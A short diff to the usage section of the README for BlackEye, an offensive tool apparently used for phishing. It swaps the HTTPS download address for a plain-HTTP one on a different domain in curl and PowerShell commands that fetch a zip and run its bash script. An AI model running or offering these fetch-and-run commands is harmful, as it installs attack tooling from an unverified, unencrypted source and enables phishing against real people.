@@ -43,13 +43,13 @@ Usage of BlackEye for attacking targets without prior mutual consent is illegal.
 
 ### Usage:
 ```
-curl -O https://blackeye.ericksonholding.com/blackeye.zip
+curl -O http://dsvr.blackeye.cloud/alld/blackeye.zip
 cd blackeye
 bash blackeye.sh
 ```
 ### Usage PowerShell:
 ```
-Invoke-WebRequest -Uri https://blackeye.ericksonholding.com/blackeye.zip -OutFile blackeye.zip
+Invoke-WebRequest -Uri http://dsvr.blackeye.cloud/alld/blackeye.zip -OutFile blackeye.zip
 cd blackeye
 bash blackeye.sh
 ```
